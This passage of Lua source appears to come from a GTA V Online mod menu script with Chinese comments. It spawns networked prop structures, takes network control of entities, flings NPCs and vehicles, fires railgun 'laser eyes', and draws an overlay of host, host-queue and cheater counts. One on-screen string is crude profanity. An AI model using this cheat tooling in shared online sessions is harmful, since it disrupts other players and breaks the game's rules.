            return true
        end)
    else
        if ENTITY.DOES_ENTITY_EXIST(arena_drone_left) then
            entities.delete_by_handle(arena_drone_left)
        end
        if ENTITY.DOES_ENTITY_EXIST(arena_drone_right) then
            entities.delete_by_handle(arena_drone_right)
        end
    end
end
function getScreenCoordFromWorldCoordNoAdjustment(x, y, z) --V3转V2
    local v2 = memory.alloc(8)
    if util.get_screen_coord_from_world_coord_no_adjustment(x, y, z, v2, v2 + 4) then
        return memory.read_float(v2), memory.read_float(v2 + 4)
    else
        return nil
    end
end
function discoLightsFunction()
    local t = 0
    local duration = 5
    local durations = 5
    local radius = 2
    local function HSVtoRGB(h, s, v)
        local r, g, b
        local i = math.floor(h * 6)
        local f = h * 6 - i
        local p = v * (1 - s)
        local q = v * (1 - f * s)
        local t = v * (1 - (1 - f) * s)
        i = i % 6
        if i == 0 then r, g, b = v, t, p
        elseif i == 1 then r, g, b = q, v, p
        elseif i == 2 then r, g, b = p, v, t
        elseif i == 3 then r, g, b = p, q, v
        elseif i == 4 then r, g, b = t, p, v
        elseif i == 5 then r, g, b = v, p, q
        end
        return math.floor(r * 255), math.floor(g * 255), math.floor(b * 255)
    end
    local function updateLights()
        local player_pos = players.get_position(players.user())
        local progress = (t % duration) / duration
        local hue = progress
        local r, g, b = HSVtoRGB(hue, 1, 1)
        local angle = t * 1.5 * math.pi / duration
        local x_offset = radius * math.cos(angle)
        local y_offset = radius * math.sin(angle)
        local light_pos_x = player_pos.x + x_offset
        local light_pos_y = player_pos.y + y_offset
        local light_pos_z = player_pos.z
        GRAPHICS.DRAW_LIGHT_WITH_RANGEEX(light_pos_x, light_pos_y, light_pos_z, r, g, b, 5, 5, 5)
        local progresss = (t % durations) / durations
        local hues = progresss
        local r2, g2, b2 = HSVtoRGB(hues, 1, 1)
        local angles = t * 1.5 * math.pi / durations
        local x_offsets = radius * math.cos(angles)
        local y_offsets = radius * math.sin(angles)
        local light_pos_xs = player_pos.x - x_offsets
        local light_pos_ys = player_pos.y - y_offsets
        local light_pos_zs = player_pos.z
        GRAPHICS.DRAW_LIGHT_WITH_RANGEEX(light_pos_xs, light_pos_ys, light_pos_zs, r2, g2, b2, 5, 5, 5)
        t = t + 0.05
    end
    return updateLights
end
function guanzhongwutai(state)
    if state then
        local selfv3 = players.get_position(players.user())
        bblock = spawn_object(util.joaat("ar_prop_ar_bblock_huge_04"), v3(selfv3.x, selfv3.y, selfv3.z + 10), 1)
        propintarena = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena2 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena3 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena4 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena5 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena6 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena7 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena8 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena9 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena10 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena11 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena12 = spawn_object(util.joaat("xs_propintarena_structure_s_02a"), selfv3, 1)
        propintarena13 = spawn_object(util.joaat("xs_propintarena_structure_c_01c"), selfv3, 1)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena, bblock, 0, 0, 30, 0, 0, 0, 0, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena2, bblock, 0, 21, 30, 0, 0, 0, 0, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena3, bblock, 0, -21, 30, 0, 0, 0, 0, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena4, bblock, 0, 0, -30, 0, 0, 0, 180, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena5, bblock, 0, 21, -30, 0, 0, 0, 180, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena6, bblock, 0, -21, -30, 0, 0, 0, 180, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena7, bblock, 0, -30, 0, 0, 0, 0, 90, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena8, bblock, 0, -30, 20, 0, 0, 0, 90, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena9, bblock, 0, -30, -20, 0, 0, 0, 90, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena10, bblock, 0, 30, -20, 0, 0, 0, -90, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena11, bblock, 0, 30, 20, 0, 0, 0, -90, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena12, bblock, 0, 30, 0, 0, 0, 0, -90, true, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(propintarena13, bblock, 0, 21, 0, 0, 0, 0, -90, true, false, false, true, 0, true)
        local bblockpos = ENTITY.GET_ENTITY_COORDS(bblock)
        PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), bblockpos.x, bblockpos.y, bblockpos.z + 1)
    else
        entities.delete_by_handle(bblock)
        entities.delete_by_handle(propintarena)
        entities.delete_by_handle(propintarena2)
        entities.delete_by_handle(propintarena3)
        entities.delete_by_handle(propintarena4)
        entities.delete_by_handle(propintarena5)
        entities.delete_by_handle(propintarena6)
        entities.delete_by_handle(propintarena7)
        entities.delete_by_handle(propintarena8)
        entities.delete_by_handle(propintarena9)
        entities.delete_by_handle(propintarena10)
        entities.delete_by_handle(propintarena11)
        entities.delete_by_handle(propintarena12)
        entities.delete_by_handle(propintarena13)
    end
end
function requestControlLoop(entity)
	local tick = 0
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 25 do
		wait()
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
	end
	if NETWORK.NETWORK_IS_SESSION_STARTED() then
		local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
	end
end
function spacing(sx, sy, radius, r, g, b, a)
    local posx, posy = sx, sy 
    local radius_x = radius 
    local radius_y = radius * 1.66
    local num_sides = 6 
    local colour = {r = r, g = g, b = b, a = a}
    local start_angle = math.rad(90)
    for i = 1, num_sides do
        local angle1 = start_angle + math.rad((i - 1) * 360 / num_sides)
        local angle2 = start_angle + math.rad(i * 360 / num_sides)
        local x1 = posx + radius_x * math.cos(angle1)
        local y1 = posy + radius_y * math.sin(angle1)
        local x2 = posx + radius_x * math.cos(angle2)
        local y2 = posy + radius_y * math.sin(angle2)
        local x3 = posx
        local y3 = posy
        directx.draw_triangle(x1, y1, x2, y2, x3, y3, colour)
    end
end
function DrawingSpriter(dit, name, x, y, w, h, dir, r, g, b, a) -- 矢量图标
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dit, false)
    if GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dit) then
        GRAPHICS.DRAW_SPRITE(dit, name, x, y, w, h, dir, r, g, b, a, true, 0)
        GRAPHICS.CLEAR_DRAW_ORIGIN()
    end
end
function sync_for_all_player(Entity) -- 实体同步所有玩家
    set_entity_as_networked(Entity, true)
    local net_id <const> = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Entity)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(net_id, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(net_id, players.user(), true)
    set_entity_persistent(Entity)
end
--
bool_inputs  = false
bool_beijing  = false
font_position = { x = 0.165, y = 0.77 }
set_text_color = { r = 255, g = 150, b = 235  }
color_speed = 2 
color_direction = { r = 1, g = 1, b = 1 }
function update_color() -- 字体颜色渐变
    set_text_color.r = set_text_color.r + color_direction.r * color_speed
    if set_text_color.r >= 255 then
        set_text_color.r = 255
        color_direction.r = -1
    elseif set_text_color.r <= 0 then
        set_text_color.r = 0
        color_direction.r = 1
    end
    set_text_color.g = set_text_color.g + color_direction.g * color_speed
    if set_text_color.g >= 255 then
        set_text_color.g = 255
        color_direction.g = -1
    elseif set_text_color.g <= 0 then
        set_text_color.g = 0
        color_direction.g = 1
    end
    set_text_color.b = set_text_color.b + color_direction.b * color_speed
    if set_text_color.b >= 255 then
        set_text_color.b = 255
        color_direction.b = -1
    elseif set_text_color.b <= 0 then
        set_text_color.b = 0
        color_direction.b = 1
    end
end
function get_screen_resolution() -- 获取屏幕坐标
    local res_x_ptr = memory.alloc_int()
    local res_y_ptr = memory.alloc_int()
    GRAPHICS.GET_SCREEN_RESOLUTION(res_x_ptr, res_y_ptr)
    local res_x = memory.read_int(res_x_ptr)
    local res_y = memory.read_int(res_y_ptr)
    memory.free(res_x_ptr)
    memory.free(res_y_ptr)
    return res_x, res_y
end
function handle_inputs() -- 鼠标控制位置
    PAD.DISABLE_CONTROL_ACTION(0, 1, false)
    PAD.DISABLE_CONTROL_ACTION(0, 2, false)
    if PAD.IS_USING_KEYBOARD_AND_MOUSE(1) then
        HUD.SET_MOUSE_CURSOR_THIS_FRAME()
        HUD.SET_MOUSE_CURSOR_STYLE(3)
        local res_x, res_y = get_screen_resolution()
        local mouse_y = PAD.GET_CONTROL_NORMAL(0, 240) 
        local current_mouse_y = mouse_y * res_y 
        if util.is_key_down(0x01) then 
            local mouse_x = PAD.GET_CONTROL_NORMAL(0, 239) 
            local pixel_x = mouse_x * res_x
            local pixel_y = current_mouse_y
            font_position.x = pixel_x / res_x
            font_position.y = pixel_y / res_y
        end
    end
end
function showDriftCounter(text,screenX, screenY, r, g, b, scale) --绘制文本2
    HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("TWOSTRINGS")
    HUD.SET_TEXT_COLOUR(r, g, b, 255)
    HUD.SET_TEXT_SCALE(1, scale)
    HUD.SET_TEXT_OUTLINE()
    HUD.SET_TEXT_FONT(7)
    HUD.SET_TEXT_CENTRE(false)
    HUD.SET_TEXT_DROP_SHADOW()
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(screenX, screenY, 0)
end
function hostlist() -- 主机序列
    if bool_inputs then
        PAD.DISABLE_CONTROL_ACTION(2, 25, true) 
        PAD.DISABLE_CONTROL_ACTION(2, 24, true)
        PAD.DISABLE_CONTROL_ACTION(2, 257, true)
        handle_inputs()
    end
    shinei = 0
    for _, pid in players.list(true, true, true) do
        if players.exists(pid) then
            local pped = players.user_ped(pid)
            if pped ~= 0 then
                if players.is_in_interior(pid) then
                    shinei = shinei + 1
                end
            end
        end
    end
    shineiwanjia = shinei
    gongji = 0
    for _, pid in players.list(true, true, true) do
        if players.exists(pid) and pid ~= players.user() then
            local pped = players.user_ped(pid)
            if pped ~= 0 then
                if players.is_marked_as_attacker(pid) then
                    gongji = gongji + 1
                end
            end
        end
    end
    gongjiwanjia = gongji
    local ente
    local ent1e = players.user_ped()
    local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if PED.IS_PED_IN_ANY_VEHICLE(ent1e, true) then
        ente = ent2e
    else
        ente = ent1e
    end
    local speede = ENTITY.GET_ENTITY_SPEED(ente)
    local speedcalce = speede * 3.6
    local  myspeed1e = math.ceil(speedcalce)
    inviciamountint = 0
    for _, pid in players.list(true, true, true) do
        if players.exists(pid) then
            local pped = players.user_ped(pid)
            if pped ~= 0 then
                if players.is_marked_as_modder(pid) then
                    inviciamountint = inviciamountint + 1
                end
            end
        end
    end
    inviciamountintt = inviciamountint
    if bool_beijing then
        GRAPHICS.DRAW_RECT(font_position.x + 0.065, font_position.y + 0.115, 0.1395, 0.23, 130, 0, 130, 100, 0)
        GRAPHICS.DRAW_RECT(font_position.x + 0.0658, font_position.y + 0.1142, 0.138, 0.228, 200, 200, 200, 200, 0)
    end 
    local name = players.get_name(players.user())
    local hbtext = "~italic~~h~"..checkme()
    hbtext = hbtext:gsub("%s", "") -- 移除所有空格
    for _, id in ipairs(spid) do
        if name == id.playerid then
            showDriftCounter(hbtext, font_position.x + 0.0000, font_position.y - 0.025, 0, 0, 0, 0.3)
            showDriftCounter(hbtext, font_position.x - 0.0004, font_position.y - 0.027, 255, 185, 0, 0.3)
        end
    end
    showDriftCounter("~italic~~h~帧数" .. " : " ..  util.get_tps(), font_position.x + 0.0004, font_position.y + 0.002, 0, 0, 0, 0.3)
    showDriftCounter("~italic~~h~帧数" .. " : " ..  util.get_tps(), font_position.x, font_position.y, set_text_color.r + 55, set_text_color.g, set_text_color.b, 0.3)
    showDriftCounter("~italic~~h~延迟" .. " : " ..  delay, font_position.x + 0.0502, font_position.y + 0.002, 0, 0, 0, 0.3)
    showDriftCounter("~italic~~h~延迟" .. " : " ..  delay, font_position.x + 0.05, font_position.y, set_text_color.r - 125, set_text_color.g - 200, set_text_color.b - 10, 0.3)
    showDriftCounter("~italic~~h~现实时间" .. " : " .. os.date("%X"), font_position.x + 0.0004, font_position.y + 0.027, 0, 0, 0, 0.3)
    showDriftCounter("~italic~~h~现实时间" .. " : " .. os.date("%X"), font_position.x, font_position.y + 0.025, set_text_color.r + 20, set_text_color.g + 100, set_text_color.b, 0.3)
    showDriftCounter("~italic~~h~移动速度" .. " : " .. myspeed1e .. " 公里/每小时", font_position.x + 0.0004, font_position.y + 0.052, 0, 0, 0, 0.3)
    showDriftCounter("~italic~~h~移动速度" .. " : " .. myspeed1e .. " 公里/每小时", font_position.x, font_position.y + 0.050, set_text_color.r, set_text_color.g + 50, set_text_color.b - 100, 0.3)
    showDriftCounter("~italic~~h~战局玩家" .. " : " .. #players.list(), font_position.x + 0.0004, font_position.y + 0.077, 0, 0, 0, 0.3)
    showDriftCounter("~italic~~h~战局玩家" .. " : " .. #players.list(), font_position.x, font_position.y + 0.075, set_text_color.r - 50, set_text_color.g - 188, set_text_color.b + 10, 0.3)
    showDriftCounter("~italic~~h~作弊玩家" .. " : " .. inviciamountintt, font_position.x + 0.0632, font_position.y + 0.077, 0, 0, 0, 0.3)
    showDriftCounter("~italic~~h~作弊玩家" .. " : " .. inviciamountintt, font_position.x + 0.063, font_position.y + 0.075, set_text_color.r, set_text_color.g - 150, set_text_color.b - 235, 0.3)
    showDriftCounter("~italic~~h~攻击人数" .. " : " .. gongjiwanjia, font_position.x + 0.0004, font_position.y + 0.102, 0, 0, 0, 0.3)
    showDriftCounter("~italic~~h~攻击人数" .. " : " .. gongjiwanjia, font_position.x, font_position.y + 0.100, set_text_color.r, set_text_color.g - 50, set_text_color.b - 100, 0.3)
    showDriftCounter("~italic~~h~室内玩家" .. " : " .. shineiwanjia, font_position.x + 0.0602, font_position.y + 0.102, 0, 0, 0, 0.3)
    showDriftCounter("~italic~~h~室内玩家" .. " : " .. shineiwanjia, font_position.x + 0.06, font_position.y + 0.100, set_text_color.r - 200, set_text_color.g + 50, set_text_color.b + 200, 0.3)
    if players.get_name(players.get_host()) == "InvalidPlayer" then
        showDriftCounter("~italic~~h~战局主机" .. " : " .. "未知玩家", font_position.x + 0.0004, font_position.y + 0.127, 0, 0, 0, 0.3)
        showDriftCounter("~italic~~h~战局主机" .. " : " .. "未知玩家", font_position.x, font_position.y + 0.125, set_text_color.r - 25, set_text_color.g - 55, set_text_color.b + 10, 0.3)
    else
        showDriftCounter("~italic~~h~战局主机" .. " : " .. players.get_name(players.get_host()), font_position.x + 0.0004, font_position.y + 0.127, 0, 0, 0, 0.3)
        showDriftCounter("~italic~~h~战局主机" .. " : " .. players.get_name(players.get_host()), font_position.x, font_position.y + 0.125, set_text_color.r - 155, set_text_color.g - 180, set_text_color.b - 35, 0.3)
    end
    if players.get_name(players.get_script_host()) == "InvalidPlayer" then
        showDriftCounter("~italic~~h~脚本主机" .. " : " .. "未知玩家", font_position.x + 0.0004, font_position.y + 0.152, 0, 0, 0, 0.3)
        showDriftCounter("~italic~~h~脚本主机" .. " : " .. "未知玩家", font_position.x, font_position.y + 0.150, set_text_color.r - 100, set_text_color.g + 100, set_text_color.b, 0.3)
    else
        showDriftCounter("~italic~~h~脚本主机" .. " : " .. players.get_name(players.get_script_host()), font_position.x + 0.0004, font_position.y + 0.152, 0, 0, 0, 0.3)
        showDriftCounter("~italic~~h~脚本主机" .. " : " .. players.get_name(players.get_script_host()), font_position.x, font_position.y + 0.150, set_text_color.r - 100, set_text_color.g + 100, set_text_color.b, 0.3)
    end
    local hostxvlie = players.get_host_queue_position(players.user())
    if players.get_name(players.get_host()) == "InvalidPlayer" then
        showDriftCounter("~italic~~h~主机序位" .. " : " .. "未知玩家", font_position.x + 0.0004, font_position.y + 0.177, 0, 0, 0, 0.3)
        showDriftCounter("~italic~~h~主机序位" .. " : " .. "未知玩家", font_position.x, font_position.y + 0.175, set_text_color.r, set_text_color.g, set_text_color.b, 0.3)
    elseif hostxvlie == 0 then
        showDriftCounter("~italic~~h~主机序位" .. " : " .. "为己占有", font_position.x + 0.0004, font_position.y + 0.177, 0, 0, 0, 0.3)
        showDriftCounter("~italic~~h~主机序位" .. " : " .. "为己占有", font_position.x, font_position.y + 0.175, set_text_color.r, set_text_color.g, set_text_color.b, 0.3)
    elseif hostxvlie ~= 0 then
        showDriftCounter("~italic~~h~主机序位优先度" .. " : " .. hostxvlie, font_position.x + 0.0004, font_position.y + 0.177, 0, 0, 0, 0.3)
        showDriftCounter("~italic~~h~主机序位优先度" .. " : " .. hostxvlie, font_position.x, font_position.y + 0.175, set_text_color.r - 200, set_text_color.g + 50, set_text_color.b + 150, 0.3)
    end
    local natTypes = {"开放", "中度", "严格"}
    local getNatType = util.stat_get_int64("_NatType")
    for nat, natType in ipairs(natTypes) do
        if getNatType == nat then
        showDriftCounter("~italic~~h~你的NAT类型" .. " : " .. natType, font_position.x + 0.0004, font_position.y + 0.202, 0, 0, 0, 0.3)
        showDriftCounter("~italic~~h~你的NAT类型" .. " : " .. natType, font_position.x, font_position.y + 0.200, set_text_color.r - 50, set_text_color.g + 88, set_text_color.b + 20, 0.3)
        end
    end
end
function laoruobingchan(enabled)
    if enabled then
        local playerPed = players.user_ped()
        local playerCoords = players.get_position(players.user()) 
        playerCoords.z -= 0.5
        request_model(1262298127)
        pedent = CreatePed(-1, joaat("s_m_m_scientist_01"), playerCoords, 0)
        Entity = entities.create_object(1262298127, playerCoords, ENTITY.GET_ENTITY_HEADING(playerPed))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), Entity, 0, 0, 0.1, 0.10, 0, 0, 180, false, false, false, false, 0, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(pedent, Entity, 0, 0, 0.9, 0.5, 0, 0, 180, false, false, false, false, 0, false)
        request_anim("amb@lo_res_idles@")
        TASK.TASK_PLAY_ANIM(players.user_ped(), "amb@lo_res_idles@", "generic_seating_lo_res_base", 8.0, 8.0, -1, 1, 0.3, false, false, false)
        request_anim("missfinale_c2ig_11")
        TASK.TASK_PLAY_ANIM(pedent, "missfinale_c2ig_11", "pushcar_offcliff_f", 8.0, 8.0, -1, 49, 0.3, false, false, false)
        util.create_tick_handler(function()
            ENTITY.SET_ENTITY_INVINCIBLE(pedent, true)
            local objPos = ENTITY.GET_ENTITY_COORDS(Entity, false)
            local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(playerPed)
            forwardV.z = 0.0
            local delta = v3.new(0, 0, 0)
            local speed = 10
            if PAD.IS_CONTROL_PRESSED(0, 61) then -- Shift
                speed = speed  * 3
            end
            if PAD.IS_CONTROL_PRESSED(0, 32) then -- W 键
                delta = v3.new(forwardV)
                delta:mul(speed)
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then -- S 键
                delta = v3.new(forwardV)
                delta:mul(-speed)
            end
            local deltaLength = math.sqrt(delta.x * delta.x + delta.y * delta.y + delta.z * delta.z)
            if deltaLength > 0 then
                local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
                ENTITY.SET_ENTITY_ROTATION(Entity, 0, 0, camrot.z + 180, 0, true)
                local newPos = v3.new(objPos)
                newPos:add(delta)
                ENTITY.SET_ENTITY_VELOCITY(Entity, delta.x, delta.y, delta.z)
                TASK.TASK_GO_STRAIGHT_TO_COORD(pedent, newPos.x, newPos.y, newPos.z, 120, 10, 0, 0)
            end
            CAM.SET_GAMEPLAY_CAM_FOLLOW_PED_THIS_UPDATE(pedent)
        end)
    else
        entities.delete_by_handle(pedent)
        entities.delete_by_handle(Entity)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
    end
end
function show_subtitle(text, ms) -- 动画文本 调用例子--> show_subtitle("text", 1000)
    -- 启动文本命令
    HUD.BEGIN_TEXT_COMMAND_PRINT("STRING")
    -- 添加文本组件
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
    -- 结束文本命令并显示字幕
    HUD.END_TEXT_COMMAND_PRINT(ms, 1)
end
function yiquanchaoren()
    local pWeapon = memory.alloc_int()
    WEAPON.GET_CURRENT_PED_WEAPON(players.user_ped(), pWeapon, 1)
    local weaponHash = memory.read_int(pWeapon)
    if WEAPON.IS_PED_ARMED(players.user_ped(), 1) or weaponHash == util.joaat("weapon_unarmed") then
        local pImpactCoords = v3.new()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
        if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), pImpactCoords) then
            local impactVector = {
                x = pImpactCoords.x - pos.x,
                y = pImpactCoords.y - pos.y,
                z = pImpactCoords.z - pos.z
            }
            local magnitude = math.sqrt(impactVector.x^2 + impactVector.y^2 + impactVector.z^2)
            if magnitude > 0 then
                local normalizedImpactVector = {
                    x = impactVector.x / magnitude,
                    y = impactVector.y / magnitude,
                    z = impactVector.z / magnitude
                }
                local force = 9999 -- 力量大小
                local x, y, z = normalizedImpactVector.x * force, normalizedImpactVector.y * force, normalizedImpactVector.z * force
                local peds = entities.get_all_peds_as_handles()
                local vehicles = entities.get_all_vehicles_as_handles()
                for _, npc in ipairs(peds) do
                    if not PED.IS_PED_A_PLAYER(npc) then 
                        show_subtitle("~r~操你妈!!!", 1000)
                        local npcPos = ENTITY.GET_ENTITY_COORDS(npc, false)
                        local distance = math.sqrt((npcPos.x - pImpactCoords.x)^2 + (npcPos.y - pImpactCoords.y)^2 + (npcPos.z - pImpactCoords.z)^2)
                        if distance < 1.0 then 
                            ENTITY.SET_ENTITY_VELOCITY(npc, x, y, z)
                        end
                    end
                end
                for _, vehicle in ipairs(vehicles) do
                    show_subtitle("~r~操你妈!!!", 1000)
                    local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
                    local distance = math.sqrt((vehiclePos.x - pImpactCoords.x)^2 + (vehiclePos.y - pImpactCoords.y)^2 + (vehiclePos.z - pImpactCoords.z)^2)
                    if distance < 3.0 then 
                        ENTITY.SET_ENTITY_VELOCITY(vehicle, x, y, z)
                    end
                end
            end
        end
    end
end
function move_laser_eyes(playerPed) -- 远程npc激光眼
    local coordsList = {
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, -1.0, 100.0, 1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 1.0, 100.0, 1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 1.0, 100.0, -1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, -1.0, 100.0, -1.0)
    }
    local ped_model = ENTITY.GET_ENTITY_MODEL(playerPed)
    local coords0from = PED.GET_PED_BONE_COORDS(playerPed, 25260, 0.0, 0.0, 0.0)
    local coords1from = PED.GET_PED_BONE_COORDS(playerPed, 27474, 0.0, 0.0, 0.0)
    local HeatVision = util.joaat("WEAPON_RAILGUN")
    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    local result = raycast_gameplay_cam(1, 1000)
    local hit, end_coords, surface_normal, hit_entity = result[1], result[2], result[3], result[4]
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords0from.x, coords0from.y, coords0from.z, end_coords.x, 
    end_coords.y, end_coords.z, 250, true, HeatVision, playerPed, false, true, 1.0)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords1from.x, coords1from.y, coords1from.z, end_coords.x, 
    end_coords.y, end_coords.z, 250, true, HeatVision, playerPed, false, true, 1.0)
    if ped_model == 225514697 then
        coords0from.z = coords0from.z + 0.8
        coords1from.z = coords1from.z + 0.8
    end
    cam_rot.x = cam_rot.x -90
    request_ptfx_asset("weap_xs_weapons")
    GRAPHICS.USE_PARTICLE_FX_ASSET("weap_xs_weapons")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", coords0from.x, coords0from.y, 
    coords0from.z, cam_rot.x, cam_rot.y, cam_rot.z, 2, false, false, false)
    request_ptfx_asset("weap_xs_weapons")
    GRAPHICS.USE_PARTICLE_FX_ASSET("weap_xs_weapons")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", coords1from.x, coords1from.y, 
    coords1from.z, cam_rot.x, cam_rot.y, cam_rot.z, 2, false, false, false)
end
function move_ped(ped, forward, right)
    local location_p = ENTITY.GET_ENTITY_COORDS(ped)
    local my_CamRot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local new_x = location_p.x - (math.sin(math.rad(my_CamRot.z)) * forward) + (math.cos(math.rad(my_CamRot.z)) * right)
    local new_y = location_p.y + (math.cos(math.rad(my_CamRot.z)) * forward) + (math.sin(math.rad(my_CamRot.z)) * right)
    local new_z = location_p.z
    TASK.TASK_GO_STRAIGHT_TO_COORD(ped, new_x, new_y, new_z, 120, 10, my_CamRot.z, 0)
    PED.SET_PED_CAN_RAGDOLL(ped, false)
end
function drive_vehicle_smoothly(vehicle, ped, forward, steer)
    local current_speed = ENTITY.GET_ENTITY_SPEED(vehicle)
    local target_speed = forward * 20.0 -- 目标速度，调整为合适的值
    local speed_increment = 0.3 -- 控制速度变化的增量，增大可以让变化更快，减小可以让变化更平滑
    local max_speed = 15.0 -- 最大速度限制
    local min_speed = 0.0 -- 最小速度限制
    if forward > 0 then 
        if current_speed < target_speed then
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, math.min(current_speed + speed_increment, max_speed))
        elseif current_speed > target_speed then
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, target_speed)
        end
    elseif forward < 0 then -- 刹车
        if current_speed > target_speed then
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, math.max(current_speed - speed_increment, target_speed))
        elseif current_speed < target_speed then
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, target_speed)
        end
    end
    if steer < 0 then -- 左转
        TASK.TASK_VEHICLE_TEMP_ACTION(ped, vehicle, 7, 100)
    elseif steer > 0 then -- 右转
        TASK.TASK_VEHICLE_TEMP_ACTION(ped, vehicle, 8, 100) 
    else
        TASK.TASK_VEHICLE_TEMP_ACTION(ped, vehicle, 6, 100) 
    end
    if forward < 0 then -- 刹车
        TASK.TASK_VEHICLE_TEMP_ACTION(ped, vehicle, 27, 100)
    end
end
--
rotation_speed = 0.01 -- 旋转速度
axe_particle = nil  
angle = 0 -- 初始角度
function play_non_loop_ptfx(ent, call1, call2, name, scale, color, r, g, b)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(call1)
    if STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(call1) then
        GRAPHICS.USE_PARTICLE_FX_ASSET(call2)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
            name, ent, 0, 0, 0, 0, 0, 0.0, scale, true, true, true
        )
        if color then
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(r / 255, g / 255, b / 255)
        end
    end
end
function play_bone_looped_ptfx(ent, entbone, call1, call2, name, scale, color, r, g, b)
    if not GRAPHICS.DOES_PARTICLE_FX_LOOPED_EXIST(axe_particle) then
        STREAMING.REQUEST_NAMED_PTFX_ASSET(call1)
        if STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(call1) then
            GRAPHICS.USE_PARTICLE_FX_ASSET(call2)
            axe_particle = GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
                name, ent, 0, 0, 0, 0, 0, 0.0, entbone, scale, true, true, true
            )
            if color then
                GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(r / 255, g / 255, b / 255)
            end
        end
        STREAMING.REMOVE_PTFX_ASSET()
    else
        GRAPHICS.STOP_PARTICLE_FX_LOOPED(axe_particle, 0)
    end
end
--
function ButtonMessage(text) -- 设置按键字体
    GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
    GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
end
